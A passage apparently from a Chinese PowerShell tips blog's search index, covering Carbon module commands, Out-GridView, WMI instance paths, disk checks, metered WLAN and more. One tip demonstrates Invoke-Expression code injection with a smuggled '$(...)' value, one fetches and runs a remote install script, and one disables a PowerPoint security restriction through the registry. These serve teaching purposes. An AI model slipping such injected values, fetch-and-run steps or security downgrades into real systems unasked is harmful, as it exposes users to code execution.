Test-DscTargetResource 2.9.2 CarbonAlias Test-FileShare 2.9.2 CarbonAlias Test-FirewallStatefulFtp 2.9.2 CarbonAlias Test-Group 2.9.2 CarbonAlias Test-GroupMember 2.9.2 CarbonAlias Test-Identity 2.9.2 CarbonAlias Test-IisAppPool 2.9.2 CarbonAlias Test-IisConfigurationSection 2.9.2 CarbonAlias Test-IisSecurityAuthentication 2.9.2 CarbonAlias Test-IisWebsite 2.9.2 CarbonAlias Test-IPAddress 2.9.2 CarbonAlias Test-MsmqMessageQueue 2.9.2 CarbonAlias Test-NtfsCompression 2.9.2 CarbonAlias Test-OSIs32Bit 2.9.2 CarbonAlias Test-OSIs64Bit 2.9.2 CarbonAlias Test-PathIsJunction 2.9.2 CarbonAlias Test-PerformanceCounter 2.9.2 CarbonAlias Test-PerformanceCounterCategory 2.9.2 CarbonAlias Test-Permission 2.9.2 CarbonAlias Test-PowerShellIs32Bit 2.9.2 CarbonAlias Test-PowerShellIs64Bit 2.9.2 CarbonAlias Test-Privilege 2.9.2 CarbonAlias Test-RegistryKeyValue 2.9.2 CarbonAlias Test-ScheduledTask 2.9.2 CarbonAlias Test-Service 2.9.2 CarbonAlias Test-SslCertificateBinding 2.9.2 CarbonAlias Test-TypeDataMember 2.9.2 CarbonAlias Test-UncPath 2.9.2 CarbonAlias Test-User 2.9.2 CarbonAlias Test-WindowsFeature 2.9.2 CarbonAlias Test-ZipFile 2.9.2 CarbonAlias Uninstall-Certificate 2.9.2 CarbonAlias Uninstall-Directory 2.9.2 CarbonAlias Uninstall-FileShare 2.9.2 CarbonAlias Uninstall-Group 2.9.2 CarbonAlias Uninstall-IisAppPool 2.9.2 CarbonAlias Uninstall-IisWebsite 2.9.2 CarbonAlias Uninstall-Junction 2.9.2 CarbonAlias Uninstall-MsmqMessageQueue 2.9.2 CarbonAlias Uninstall-PerformanceCounterCategory 2.9.2 CarbonAlias Uninstall-ScheduledTask 2.9.2 CarbonAlias Uninstall-Service 2.9.2 CarbonAlias Uninstall-User 2.9.2 CarbonAlias Unlock-IisConfigurationSection 2.9.2 CarbonAlias Unprotect-AclAccessRules 2.9.2 CarbonAlias Unprotect-String 2.9.2 CarbonAlias Write-DscError 2.9.2 CarbonAlias Write-File 2.9.2 CarbonFunction Add-CGroupMember 2.9.2 CarbonFunction Add-CTrustedHost 2.9.2 CarbonFunction Assert-CAdminPrivilege 2.9.2 CarbonFunction Assert-CFirewallConfigurable 2.9.2 CarbonFunction Assert-CService 2.9.2 CarbonFunction Clear-CDscLocalResourceCache 2.9.2 CarbonFunction Clear-CMofAuthoringMetadata 2.9.2 CarbonFunction Clear-CTrustedHost 2.9.2 CarbonFunction Complete-CJob 2.9.2 CarbonFunction Compress-CItem 2.9.2 CarbonFunction Convert-CSecureStringToString 2.9.2 CarbonFunction Convert-CXmlFile 2.9.2 CarbonFunction ConvertFrom-CBase64 2.9.2 CarbonFunction ConvertTo-CBase64 2.9.2 CarbonFunction ConvertTo-CContainerInheritanceFlags 2.9.2 CarbonFunction ConvertTo-CInheritanceFlag 2.9.2 CarbonFunction ConvertTo-CPropagationFlag 2.9.2 CarbonFunction ConvertTo-CSecurityIdentifier 2.9.2 CarbonFunction Copy-CDscResource 2.9.2 CarbonFunction Disable-CAclInheritance 2.9.2 CarbonFunction Disable-CFirewallStatefulFtp 2.9.2 CarbonFunction Disable-CIEEnhancedSecurityConfiguration 2.9.2 CarbonFunction Disable-CNtfsCompression 2.9.2 CarbonFunction Enable-CAclInheritance 2.9.2 CarbonFunction Enable-CFirewallStatefulFtp 2.9.2 CarbonFunction Enable-CIEActivationPermission 2.9.2 CarbonFunction Enable-CNtfsCompression 2.9.2 CarbonFunction Expand-CItem 2.9.2 CarbonFunction Find-CADUser 2.9.2 CarbonFunction Format-CADSearchFilterValue 2.9.2 CarbonFunction Get-CADDomainController 2.9.2 CarbonFunction Get-CCertificate 2.9.2 CarbonFunction Get-CCertificateStore 2.9.2 CarbonFunction Get-CComPermission 2.9.2 CarbonFunction Get-CComSecurityDescriptor 2.9.2 CarbonFunction Get-CDscError 2.9.2 CarbonFunction Get-CDscWinEvent 2.9.2 CarbonFunction Get-CFileShare 2.9.2 CarbonFunction Get-CFileSharePermission 2.9.2 CarbonFunction Get-CFirewallRule 2.9.2 CarbonFunction Get-CGroup 2.9.2 CarbonFunction Get-CHttpUrlAcl 2.9.2 CarbonFunction Get-CIPAddress 2.9.2 CarbonFunction Get-CMsi 2.9.2 CarbonFunction Get-CMsmqMessageQueue 2.9.2 CarbonFunction Get-CMsmqMessageQueuePath 2.9.2 CarbonFunction Get-CPathProvider 2.9.2 CarbonFunction Get-CPathToHostsFile 2.9.2 CarbonFunction Get-CPerformanceCounter 2.9.2 CarbonFunction Get-CPermission 2.9.2 CarbonFunction Get-CPowerShellModuleInstallPath 2.9.2 CarbonFunction Get-CPowershellPath 2.9.2 CarbonFunction Get-CPrivilege 2.9.2 CarbonFunction Get-CProgramInstallInfo 2.9.2 CarbonFunction Get-CRegistryKeyValue 2.9.2 CarbonFunction Get-CScheduledTask 2.9.2 CarbonFunction Get-CServiceAcl 2.9.2 CarbonFunction Get-CServiceConfiguration 2.9.2 CarbonFunction Get-CServicePermission 2.9.2 CarbonFunction Get-CServiceSecurityDescriptor 2.9.2 CarbonFunction Get-CSslCertificateBinding 2.9.2 CarbonFunction Get-CTrustedHost 2.9.2 CarbonFunction Get-CUser 2.9.2 CarbonFunction Get-CWmiLocalUserAccount 2.9.2 CarbonFunction Grant-CComPermission 2.9.2 CarbonFunction Grant-CHttpUrlPermission 2.9.2 CarbonFunction Grant-CMsmqMessageQueuePermission 2.9.2 CarbonFunction Grant-CPermission 2.9.2 CarbonFunction Grant-CPrivilege 2.9.2 CarbonFunction Grant-CServiceControlPermission 2.9.2 CarbonFunction Grant-CServicePermission 2.9.2 CarbonFunction Initialize-CLcm 2.9.2 CarbonFunction Install-CCertificate 2.9.2 CarbonFunction Install-CDirectory 2.9.2 CarbonFunction Install-CFileShare 2.9.2 CarbonFunction Install-CGroup 2.9.2 CarbonFunction Install-CJunction 2.9.2 CarbonFunction Install-CMsi 2.9.2 CarbonFunction Install-CMsmq 2.9.2 CarbonFunction Install-CMsmqMessageQueue 2.9.2 CarbonFunction Install-CPerformanceCounter 2.9.2 CarbonFunction Install-CRegistryKey 2.9.2 CarbonFunction Install-CScheduledTask 2.9.2 CarbonFunction Install-CService 2.9.2 CarbonFunction Install-CUser 2.9.2 CarbonFunction Invoke-CAppCmd 2.9.2 CarbonFunction Invoke-CPowerShell 2.9.2 CarbonFunction New-CCredential 2.9.2 CarbonFunction New-CJunction 2.9.2 CarbonFunction New-CRsaKeyPair 2.9.2 CarbonFunction New-CTempDirectory 2.9.2 CarbonFunction Read-CFile 2.9.2 CarbonFunction Remove-CDotNetAppSetting 2.9.2 CarbonFunction Remove-CEnvironmentVariable 2.9.2 CarbonFunction Remove-CGroupMember 2.9.2 CarbonFunction Remove-CHostsEntry 2.9.2 CarbonFunction Remove-CIniEntry 2.9.2 CarbonFunction Remove-CJunction 2.9.2 CarbonFunction Remove-CRegistryKeyValue 2.9.2 CarbonFunction Remove-CSslCertificateBinding 2.9.2 CarbonFunction Reset-CHostsFile 2.9.2 CarbonFunction Reset-CMsmqQueueManagerID 2.9.2 CarbonFunction Resolve-CFullPath 2.9.2 CarbonFunction Resolve-CIdentity 2.9.2 CarbonFunction Resolve-CIdentityName 2.9.2 CarbonFunction Resolve-CNetPath 2.9.2 CarbonFunction Resolve-CPathCase 2.9.2 CarbonFunction Resolve-CRelativePath 2.9.2 CarbonFunction Restart-CRemoteService 2.9.2 CarbonFunction Revoke-CComPermission 2.9.2 CarbonFunction Revoke-CHttpUrlPermission 2.9.2 CarbonFunction Revoke-CPermission 2.9.2 CarbonFunction Revoke-CPrivilege 2.9.2 CarbonFunction Revoke-CServicePermission 2.9.2 CarbonFunction Set-CDotNetAppSetting 2.9.2 CarbonFunction Set-CDotNetConnectionString 2.9.2 CarbonFunction Set-CEnvironmentVariable 2.9.2 CarbonFunction Set-CHostsEntry 2.9.2 CarbonFunction Set-CIniEntry 2.9.2 CarbonFunction Set-CRegistryKeyValue 2.9.2 CarbonFunction Set-CServiceAcl 2.9.2 CarbonFunction Set-CSslCertificateBinding 2.9.2 CarbonFunction Set-CTrustedHost 2.9.2 CarbonFunction Split-CIni 2.9.2 CarbonFunction Start-CDscPullConfiguration 2.9.2 CarbonFunction Test-CAdminPrivilege 2.9.2 CarbonFunction Test-CDotNet 2.9.2 CarbonFunction Test-CDscTargetResource 2.9.2 CarbonFunction Test-CFileShare 2.9.2 CarbonFunction Test-CFirewallStatefulFtp 2.9.2 CarbonFunction Test-CGroup 2.9.2 CarbonFunction Test-CGroupMember 2.9.2 CarbonFunction Test-CIdentity 2.9.2 CarbonFunction Test-CIPAddress 2.9.2 CarbonFunction Test-CMsmqMessageQueue 2.9.2 CarbonFunction Test-CNtfsCompression 2.9.2 CarbonFunction Test-COSIs32Bit 2.9.2 CarbonFunction Test-COSIs64Bit 2.9.2 CarbonFunction Test-CPathIsJunction 2.9.2 CarbonFunction Test-CPerformanceCounter 2.9.2 CarbonFunction Test-CPerformanceCounterCategory 2.9.2 CarbonFunction Test-CPermission 2.9.2 CarbonFunction Test-CPowerShellIs32Bit 2.9.2 CarbonFunction Test-CPowerShellIs64Bit 2.9.2 CarbonFunction Test-CPrivilege 2.9.2 CarbonFunction Test-CRegistryKeyValue 2.9.2 CarbonFunction Test-CScheduledTask 2.9.2 CarbonFunction Test-CService 2.9.2 CarbonFunction Test-CSslCertificateBinding 2.9.2 CarbonFunction Test-CTypeDataMember 2.9.2 CarbonFunction Test-CUncPath 2.9.2 CarbonFunction Test-CUser 2.9.2 CarbonFunction Test-CWindowsFeature 2.9.2 CarbonFunction Test-CZipFile 2.9.2 CarbonFunction Uninstall-CCertificate 2.9.2 CarbonFunction Uninstall-CDirectory 2.9.2 CarbonFunction Uninstall-CFileShare 2.9.2 CarbonFunction Uninstall-CGroup 2.9.2 CarbonFunction Uninstall-CJunction 2.9.2 CarbonFunction Uninstall-CMsmqMessageQueue 2.9.2 CarbonFunction Uninstall-CPerformanceCounterCategory 2.9.2 CarbonFunction Uninstall-CScheduledTask 2.9.2 CarbonFunction Uninstall-CService 2.9.2 CarbonFunction Uninstall-CUser 2.9.2 CarbonFunction Write-CDscError 2.9.2 CarbonFunction Write-CFile 2.9.2 CarbonFilter Protect-CString 2.9.2 CarbonFilter Unprotect-CString 2.9.2 Carbon","link":"/2020/03/25/adding-new-powershell-commands-with-carbon/"},{"title":"PowerShell 技能连载 - 处理 Out-GridView 的 Bug","text":"当添加 -PassThru 参数时，Out-GridView 可以用作通用的选择对话框。下面的单行停止了您在网格视图窗口中选择的所有服务（嗯，不是真的停止。在删除 -WhatIf 参数之前，都可以安全地运行）： 1Get-Service | Out-GridView -Title 'Select Service' -PassThru | Stop-Service -WhatIf 但是，Out-GridView 中存在一个长期存在的错误：将信息填充到网格视图窗口中时，启用了用于选择项目的按钮，但不返回任何内容。这是一个测试用例：我用 Windows 文件夹中大于 10MB 的所有文件填充网格视图窗口： 123Get-ChildItem -Path C:\\Windows -Recurse -File -ErrorAction SilentlyContinue | Where-Object Length -gt 10MB | Out-GridView -Title 'Select a file' -PassThru 枚举文件可能要花费一些时间，由于优雅的实时特性，过一会儿会在网格视图窗口看到列出的文件，并且可以选择一些文件，然后单击右下角的“确定”按钮将其返回到控制台。 注意：如果在所有文件都发送到网格视图窗口之前单击“确定”按钮，则网格视图窗口将关闭但不返回任何内容。为了使确定按钮正常工作，您必须知道网格视图窗口的输出何时完成。 除此以外，您无法知道什么时候结束。您可以稍等片刻，以期获得最好的结果，但是没有任何提示告诉您网格视图窗口已完全填充完毕。 一种解决方法是先将数据存储在变量中，然后将其快速发送到网格视图窗口： 1234$files = Get-ChildItem -Path C:\\Windows -Recurse -File -ErrorAction SilentlyContinue | Where-Object Length -gt 10MB$files | Out-GridView -Title 'Select a file' -PassThru 但是，这么做失去了实时性，并且可能需要等待几秒钟才能收集数据并打开网格视图窗口。 一种更聪明的方法是利用 PowerShell 的管道体系结构并使用管道感知功能。完成所有管道处理后，将调用其 “end“ 代码块，因此您可以在此处放置代码以提示所有数据已完成： 1234567891011121314151617function Send-PipelineEndNotification{ begin { Write-Host &quot;Collecting Data...&quot; -NoNewline -ForegroundColor DarkYellow } process { $_ } end { Write-Host &quot;Completed.&quot; -ForegroundColor Green [Console]::Beep() }}Get-ChildItem -Path C:\\Windows -Recurse -File -ErrorAction SilentlyContinue | Where-Object Length -gt 10MB | Send-PipelineEndNotification | Out-GridView -Title 'Select a file' -PassThru 只需在 Out-GridView 之前调用 Send-PipelineEndNotification。现在，在控制台中，您会看到一条警告，告知您仍在收集信息，并在网格视图窗口完成并准备返回所选项目时显示绿色的通知文本和提示音。","link":"/2020/03/31/dealing-with-out-gridview-bug/"},{"title":"PowerShell 技能连载 - 谨慎使用某些命令","text":"以下是在 PowerShell 脚本中经常发现的三个命令，您应该注意这些命令，因为它们可能会产生严重的副作用： exit“exit“ 实际上不是命令，而是语言的一部分。它会立即退出PowerShell，您可以选择提交一个数字，该数字将成为调用者可以获取到的 “error level”。 仅当您确实要退出 PowerShell 时才使用 “exit“。不要在旨在由其他人调用的函数或脚本中使用它。您可以试试：在函数下方运行时，它输出“ A”，然后退出。但是，您的 PowerShell 环境也将关闭。 123456function test{ &quot;A&quot; exit &quot;B&quot;} 如果只想“退出”部分代码而不退出整个 PowerShell 环境，请改用 “return“： 123456function test{ &quot;A&quot; return &quot;B&quot;} Set-StrictMode -Version Latest此命令使 PowerShell 的行为更加严格，即当您读取变量或调用实际上不存在的方法时抛出异常。在默认模式下，PowerShell 将仅返回 $null。 对于专业的 PowerShell 用户，在编写脚本代码时启用严格模式是个好主意，因为 PowerShell 会强制您编写更简洁的代码。但是，切勿将此命令添加到生产代码中！ 一方面，这没有任何意义：您的生产代码已完成，因此启用严格检查不会改变任何事情。更糟糕的是：您在生产机器上强加了自己的首选项，这可能会导致意外的（和不必要的）异常。假设您的代码调用了其他代码或使用了其他模块中的命令，并且它们的作者使用了 PowerShell 的懒惰模式。现在，当您的代码启用严格模式时，将相同的严格规则应用于从您的代码中调用的所有代码。 即使在测试过程中效果很好，您也不知道其他作者何时更新他们的代码，而导致出现问题。 如果在代码中找到 “Set-StrictMode“ 调用，只需删除它们即可。如果您喜欢严格模式，请改为在您的个人 PowerShell 配置文件中启用它，或者在需要时手动将其启用。 Invoke-Expression该命令采用任何字符串，并像执行 PowerShell 命令一样执行它。尽管这是非常强大的功能，有时甚至是绝对必要的，但它带来了类似所谓“SQL注入”安全问题的所有风险。请看以下代码： 12345678# get user input$Path = Read-Host -Prompt 'Enter path to find .log files'# compose command$code = &quot;Get-ChildItem -Path $Path -Recurse -Filter *.log -ErrorAction SilentlyContinue&quot;# invoke commandInvoke-Expression -Command $code 运行此代码时，系统会要求您提供路径，并在输入例如 “C:\\Windows“ 时看到日志文件列表。但是，执行的代码直接取决于用户输入的内容。当您再次运行代码时，请尝试以下操作：$(Get-Service | Out-GridView; c:\\Windows) 这次，PowerShell 首先列出所有服务，并将它们输出到网格视图窗口。您使用 “$()“ “注入”了代码。 尽可能避免使用 Invoke-Expression，当然，上面的示例是有意构造的。您可以将用户输入直接提交给适当的命令参数，而不是编写字符串命令： 12345# get user input$Path = Read-Host -Prompt 'Enter path to find .log files'# invoke commandGet-ChildItem -Path $Path -Recurse -Filter *.log -ErrorAction SilentlyContinue 如果必须使用 Invoke-Expression，请格外小心，验证任何用户输入，并确保用户无法注入代码。","link":"/2020/04/02/be-careful-with-some-commands/"},{"title":"PowerShell 技能连载 - 获取可用的显示分辨率","text":"WMI 可以返回显示适配器可用的显示分辨率列表： 123456789101112131415161718192021222324252627282930313233343536373839404142PS&gt; Get-CimInstance -ClassName CIM_VideoControllerResolution | Select-Object -Property SettingIDSettingID---------640 x 480 x 4294967296 colors @ 60 Hertz640 x 480 x 4294967296 colors @ 67 Hertz640 x 480 x 4294967296 colors @ 72 Hertz640 x 480 x 4294967296 colors @ 75 Hertz720 x 400 x 4294967296 colors @ 70 Hertz720 x 480 x 4294967296 colors @ 60 Hertz720 x 576 x 4294967296 colors @ 50 Hertz (Interlaced)800 x 600 x 4294967296 colors @ 60 Hertz800 x 600 x 4294967296 colors @ 72 Hertz800 x 600 x 4294967296 colors @ 75 Hertz832 x 624 x 4294967296 colors @ 75 Hertz1024 x 768 x 4294967296 colors @ 60 Hertz1024 x 768 x 4294967296 colors @ 70 Hertz1024 x 768 x 4294967296 colors @ 75 Hertz1152 x 864 x 4294967296 colors @ 75 Hertz1152 x 870 x 4294967296 colors @ 75 Hertz1280 x 720 x 4294967296 colors @ 50 Hertz (Interlaced)1280 x 720 x 4294967296 colors @ 60 Hertz1280 x 800 x 4294967296 colors @ 60 Hertz1280 x 1024 x 4294967296 colors @ 60 Hertz1280 x 1024 x 4294967296 colors @ 75 Hertz1440 x 900 x 4294967296 colors @ 60 Hertz1600 x 900 x 4294967296 colors @ 60 Hertz1680 x 1050 x 4294967296 colors @ 60 Hertz1920 x 1080 x 4294967296 colors @ 24 Hertz (Interlaced)1920 x 1080 x 4294967296 colors @ 25 Hertz (Interlaced)1920 x 1080 x 4294967296 colors @ 30 Hertz (Interlaced)1920 x 1080 x 4294967296 colors @ 50 Hertz (Interlaced)1920 x 1080 x 4294967296 colors @ 60 Hertz1920 x 1440 x 4294967296 colors @ 60 Hertz2048 x 1152 x 4294967296 colors @ 60 Hertz3840 x 2160 x 4294967296 colors @ 24 Hertz (Interlaced)3840 x 2160 x 4294967296 colors @ 25 Hertz (Interlaced)3840 x 2160 x 4294967296 colors @ 30 Hertz (Interlaced)4096 x 2160 x 4294967296 colors @ 24 Hertz (Interlaced)4096 x 2160 x 4294967296 colors @ 25 Hertz (Interlaced)4096 x 2160 x 4294967296 colors @ 30 Hertz (Interlaced) WMI 是否可以返回视频模式取决于您的视频适配器和驱动程序。如果没有可用的视频模式，则不返回任何内容。 要检查您的视频适配器，请使用 Win32_VideoController WMI类： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768PS&gt; Get-CimInstance -ClassName CIM_VideoController -Property *Caption : Intel(R) Iris(R) Plus GraphicsDescription : Intel(R) Iris(R) Plus GraphicsInstallDate :Name : Intel(R) Iris(R) Plus GraphicsStatus : OKAvailability : 3ConfigManagerErrorCode : 0ConfigManagerUserConfig : FalseCreationClassName : Win32_VideoControllerDeviceID : VideoController3ErrorCleared :ErrorDescription :LastErrorCode :PNPDeviceID : PCI\\VEN_8086&amp;DEV_8A52&amp;SUBSYS_08B01028&amp;REV_07\\3&amp;11583659&amp;0&amp;10PowerManagementCapabilities :PowerManagementSupported :StatusInfo :SystemCreationClassName : Win32_ComputerSystemSystemName : DESKTOP-8DVNI43MaxNumberControlled :ProtocolSupported :TimeOfLastReset :AcceleratorCapabilities :CapabilityDescriptions :CurrentBitsPerPixel : 32CurrentHorizontalResolution : 3840CurrentNumberOfColors : 4294967296CurrentNumberOfColumns : 0CurrentNumberOfRows : 0CurrentRefreshRate : 59CurrentScanMode : 4CurrentVerticalResolution : 2400MaxMemorySupported :MaxRefreshRate : 0MinRefreshRate :NumberOfVideoPages :VideoMemoryType : 2VideoProcessor : Intel(R) Iris(R) Graphics FamilyNumberOfColorPlanes :VideoArchitecture : 5VideoMode :AdapterCompatibility : Intel CorporationAdapterDACType : InternalAdapterRAM : 1073741824ColorTableEntries :DeviceSpecificPens :DitherType : 0DriverDate : 06.11.2019 01:00:00DriverVersion : 26.20.100.7463ICMIntent :ICMMethod :InfFilename : oem105.infInfSection : iICLD_w10_DS_NInstalledDisplayDrivers : C:\\Windows\\System32\\DriverStore\\FileRepository\\iigd_dch.inf_amd64_fdbe15db86939fb5\\igdumdim64.dll,C:\\Windows\\System32\\DriverStore\\FileRepository\\iigd_dch.inf _amd64_fdbe15db86939fb5\\igd10iumd64.dll,C:\\Windows\\System32\\DriverStore\\FileRepository\\iigd_dch.inf_amd64_fdbe15db86939fb5\\igd10iumd64.dll,C:\\Windows\\System3 2\\DriverStore\\FileRepository\\iigd_dch.inf_amd64_fdbe15db86939fb5\\igd12umd64.dllMonochrome : FalseReservedSystemPaletteEntries :SpecificationVersion :SystemPaletteEntries :VideoModeDescription : 3840 x 2400 x 4294967296 colorsPSComputerName :CimClass : root/cimv2:Win32_VideoControllerCimInstanceProperties : {Caption, Description, InstallDate, Name...}CimSystemProperties : Microsoft.Management.Infrastructure.CimSystemProperties 有关这两个类的文档，请访问 http://powershell.one/wmi/root/cimv2/cim_videocontrollerresolution 和 http://powershell.one/wmi/root/cimv2/win32_videocontroller。","link":"/2020/04/06/getting-available-video-resolutions/"},{"title":"PowerShell 技能连载 - 管理自动磁盘检测","text":"当 Windows 检测到存储驱动器有异常，它就会启用自动完整性检查。对于系统分区，在下次启动时，Windows 会显示用户提示，并要求获得执行检查的权限。 要找出启用了这种检查的所有驱动器，请运行以下命令： 12345PS&gt; Get-CimInstance -ClassName Win32_AutochkSetting | Select-Object -Property SettingID, UserInputDelaySettingID UserInputDelay--------- --------------Microsoft Windows 10 Pro|C:\\Windows|\\Device\\Harddisk0\\Partition3 8 UserInputDelay 属性指定 Windows 在启动时等待用户提示的秒数。如果届时用户仍未响应，则将自动执行磁盘完整性检查。 WMI 可以更改此设置。如果要将延迟增加到 20 秒，请使用管理员权限运行以下命令： 1Set-CimInstance -Query &quot;Select * From Win32_AutochkSetting&quot; -Property @{UserInputDelay=20} 请注意，此命令为所有受支持的磁盘驱动器设置 UserInputDelay。要仅对选定的驱动器进行设置，请优化提交的查询，然后添加一个过滤器，例如： 1Set-CimInstance -Query 'Select * From Win32_AutochkSetting Where SettingID LIKE &quot;%\\\\Device\\\\Harddisk0\\\\Partition3&quot;' -Property @{UserInputDelay=30} 有关WMI查询的更多信息，请访问 http://powershell.one/wmi/wql。","link":"/2020/04/08/manage-automatic-disk-checks/"},{"title":"PowerShell 技能连载 - 允许 PowerPoint 中的点击操作","text":"在 PowerPoint 演示文稿中使用点击操作对于启动 Visual Studio Code 或 PowerShell ISE 以及无缝打开和演示 PowerShell 代码非常有用。 但是，出于安全原因，默认情况下禁止通过插入的“操作”项启动程序，并且没有启用它的简便方法。而且，即使您确实启用了此功能，PowerPoint 也会在短时间后将其恢复为保护模式。 这是一个快速的 PowerShell脚本，您可以在演示之前立即运行它，以确保所有可点击的“操作”点击后能生效。 12$path = 'HKCU:\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security'Set-ItemProperty -Path $path -Name RunPrograms -Value 1 -Type DWord","link":"/2020/04/10/enabling-clickable-powerpoint-actions/"},{"title":"PowerShell 技能连载 - 安装 PowerShell 7","text":"PowerShell 7 是便携式应用程序，可以与 Windows PowerShell 平行运行。您只需要下载并安装它。 这部分很容易，因为 PowerShell 团队提供了自动安装脚本。只需一点技巧，您就可以下载此代码并将其绑定到新的 PowerShell 功能，从而可以非常容易地从现有 Windows PowerShell 安装 PowerShell 7： 12345678# Download installation script$code = Invoke-RestMethod -Uri https://aka.ms/install-powershell.ps1# Dynamically create PowerShell functionNew-Item -Path function: -Name Install-PowerShell -Value $code# Run PowerShel function and install the latest PowerShellInstall-PowerShell -UseMSI -Preview","link":"/2020/04/14/installing-powershell-7/"},{"title":"PowerShell 技能连载 - 使用 WMI 实例路径（第 1 部分）","text":"通常，最好远离旧的和过时的 Get-WmiObject 命令，而使用像 Get-CimInstance 这样的现代且更快的 CIM 命令。在大多数情况下，它们的效果几乎相同。 但是，在某些领域，新的 CIM 命令缺少信息。最重要的领域之一是 Get-WmiObject 返回的任何对象都可以使用的属性 “__Path“。使用 Get-CimInstance 时，会丢失这个属性。 此路径是 WMI 实例的唯一路径。请看一下——此命令列出了 Win32_Share 的所有实例，并将 WMI 路径返回给这些实例： 1234567PS&gt; Get-WmiObject -Class Win32_Share | Select-Object -ExpandProperty __Path\\\\DESKTOP-8DVNI43\\root\\cimv2:Win32_Share.Name=&quot;ADMIN$&quot;\\\\DESKTOP-8DVNI43\\root\\cimv2:Win32_Share.Name=&quot;C$&quot;\\\\DESKTOP-8DVNI43\\root\\cimv2:Win32_Share.Name=&quot;HP Universal Printing PCL 6&quot;\\\\DESKTOP-8DVNI43\\root\\cimv2:Win32_Share.Name=&quot;IPC$&quot;\\\\DESKTOP-8DVNI43\\root\\cimv2:Win32_Share.Name=&quot;OKI PCL6 Class Driver 2&quot;\\\\DESKTOP-8DVNI43\\root\\cimv2:Win32_Share.Name=&quot;print$&quot; 一旦知道实例的路径，就可以随时通过 [wmi] 类型轻松访问它： 12345PS&gt; [wmi]'\\\\DESKTOP-8DVNI43\\root\\cimv2:Win32_Share.Name=&quot;HP Universal Printing PCL 6&quot;'Name Path Description---- ---- -----------HP Universal Printing PCL 6 S/W Laser HP,LocalsplOnly S/W Laser HP 这非常有用，您可以使用现有的 WMI 路径或构造自己的 WMI 路径。例如，要访问其他服务器上的 C$ 共享，只需查看路径即可立即确定需要更改的部分： \\\\SERVER12345\\root\\cimv2:Win32_Share.Name=&quot;C$&quot; __Path 属性也使类似这样的“WMI 浏览器”成为可能： 12345678910# get all WMI instancesGet-WmiObject -Class CIM_LogicalDevice | # display propertes Select-Object -Property __Class, Name, Description, __Path | # let user select some Out-GridView -Title 'Select one or more (hold CTRL)' -PassThru | # retrieve the full selected instance by path ForEach-Object { [wmi]$_.__Path | Select-Object * | Out-Default }","link":"/2020/04/16/using-wmi-instance-paths-part-1/"},{"title":"PowerShell 技能连载 - 使用 WMI 实例路径（第 2 部分）","text":"在上一个技能中，我们演示了了新的 Get-CimInstance 命令缺少 Get-WmiObject 能够返回的重要的 “__Path“ 属性。现在让我们将此属性添加回 Get-CimInstance 中。 Get-CimInstance 返回的每个实例的类型均为 [Microsoft.Management.Infrastructure.CimInstance] 类型，因此可以用 Update-TypeData 向该类型添加新属性： 1234567891011121314151617181920$code = { # get key properties $keys = $this.psbase.CimClass.CimClassProperties.Where{$_.Qualifiers.Name -eq 'Key'}.Name $pairs = foreach($key in $keys) { '{0}=&quot;{1}&quot;' -f $key, $this.$key } # add server name $path = '\\\\{0}\\{1}:{2}.{3}' -f $this.CimSystemProperties.ServerName.ToUpper(), # add namespace $this.CimSystemProperties.Namespace.Replace(&quot;/&quot;,&quot;\\&quot;), # add class $this.CimSystemProperties.ClassName, # add key properties ($pairs -join ',') return $path}Update-TypeData -TypeName Microsoft.Management.Infrastructure.CimInstance -MemberType ScriptProperty -MemberName __Path -Value $code -Force 运行此代码后，所有 CIM 实例都将再次具有 __Path 属性。它略有不同，因为“新的” __Path 属性引用了所有键值。对于我们测试的所有用例，这都没有什么不同： 123456789101112131415161718192021222324252627PS&gt; $old = Get-WmiObject -Class Win32_BIOSPS&gt; $new = Get-CimInstance -ClassName Win32_BIOSPS&gt; $old.__PATH\\\\DESKTOP-8DVNI43\\root\\cimv2:Win32_BIOS.Name=&quot;1.0.13&quot;,SoftwareElementID=&quot;1.0.13&quot;,SoftwareElementState=3,TargetOperatingSystem=0,Version=&quot;DELL - 20170001&quot;PS&gt; $new.__Path\\\\DESKTOP-8DVNI43\\root\\cimv2:Win32_BIOS.Name=&quot;1.0.13&quot;,SoftwareElementID=&quot;1.0.13&quot;,SoftwareElementState=&quot;3&quot;,TargetOperatingSystem=&quot;0&quot;,Version=&quot;DELL - 20170001&quot;PS&gt; [wmi]($old.__Path)SMBIOSBIOSVersion : 1.0.13Manufacturer : Dell Inc.Name : 1.0.13SerialNumber : 4ZKM0Z2Version : DELL - 20170001PS&gt; [wmi]($new.__Path)SMBIOSBIOSVersion : 1.0.13Manufacturer : Dell Inc.Name : 1.0.13SerialNumber : 4ZKM0Z2Version : DELL - 20170001","link":"/2020/04/20/using-wmi-instance-paths-part-2/"},{"title":"PowerShell 技能连载 - 检测是否连接到计费的 WLAN","text":"是否曾经需要知道您当前是否已连接到计费的网络？这是一种快速的检查方法： 123456function Test-WlanMetered{ [void][Windows.Networking.Connectivity.NetworkInformation, Windows, ContentType = WindowsRuntime] $cost = [Windows.Networking.Connectivity.NetworkInformation]::GetInternetConnectionProfile().GetConnectionCost() $cost.ApproachingDataLimit -or $cost.OverDataLimit -or $cost.Roaming -or $cost.BackgroundDataUsageRestricted -or ($cost.NetworkCostType -ne &quot;Unrestricted&quot;)} 它使用一个 UWP API 返回有关网络状态的大量信息，包括有关网络是否计费的信息。 如果您使用的是较旧的 Windows 平台，则以下是替代的代码，该代码使用好用的旧版 “netsh“ 命令行工具并提取所需的信息。请注意，字符串操作（下面的代码广泛使用）容易出错，可能需要进行调整。 同时，以下代码很好地说明了如果手头没有适当的面向对象的 API 可调用，那么 PowerShell 中的通用字符串操作工具如何可以用作最后的保障： 1234567891011function Test-WlanMetered{ $wlan = (netsh wlan show interfaces | select-string &quot;SSID&quot; | select-string -NotMatch &quot;BSSID&quot;) if ($wlan) { $ssid = (($wlan) -split &quot;:&quot;)[1].Trim() -replace '&quot;' $cost = ((netsh wlan show profiles $ssid | select-string &quot;Cost|Kosten&quot;) -split &quot;:&quot;)[2].Trim() -replace '&quot;' return ($cost -ne &quot;unrestricted&quot; -and $cost -ne &quot;Uneingeschränkt&quot; -and $cost -ne 'Uneingeschr&quot;nkt') } else { $false }}","link":"/2020/04/22/testing-for-metered-wlan/"},{"title":"PowerShell 技能连载 - 使用自定义的验证器属性","text":"从 PowerShell 5开始，您可以创建自己的属性，即自定义验证程序。它们可以应用于变量（和参数），并且一旦分配的值与验证程序不匹配，就会引发异常。 这是一个路径验证器的示例。将其应用于变量时，只能将有效文件路径应用于该变量： 1234567891011121314151617181920212223class ValidatePathExistsAttribute : 